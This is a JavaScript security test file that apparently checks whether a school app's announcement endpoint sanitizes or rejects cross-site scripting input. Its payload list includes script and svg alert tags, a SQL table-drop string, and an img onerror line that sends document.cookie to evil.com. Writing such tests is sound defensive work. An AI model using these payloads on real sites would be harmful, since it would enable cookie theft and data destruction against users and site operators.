import { testApp, makeToken } from '../helpers/test-app.js';

describe('Security: XSS Prevention (CWE-79/80)', () => {
  const token = makeToken({ role: 'SCHOOL_ADMIN' });

  const xssPayloads = [
    '<script>alert(document.cookie)</script>',
    '<img src=x onerror=fetch("evil.com?c="+document.cookie)>',
    '"><script>alert(1)</script>',
    "'; DROP TABLE users; --",
    '<svg onload=alert(1)>',
  ];

  test.each(xssPayloads)(
    'sanitizes XSS in announcement title: %s',
    async (payload) => {
      const res = await testApp
        .post('/notifications/announce')
        .set('Authorization', `Bearer ${token}`)
        .send({
          title    : payload,
          body     : 'Safe body content',
          schoolId : 'valid-school-id',
        });

      if (res.status === 200) {
        // If stored, verify it was sanitized
        expect(res.body.data?.title ?? '').not.toContain('<script>');
        expect(res.body.data?.title ?? '').not.toContain('onerror=');
      }
      // 400 is also acceptable — validation rejected the payload
    }
  );
});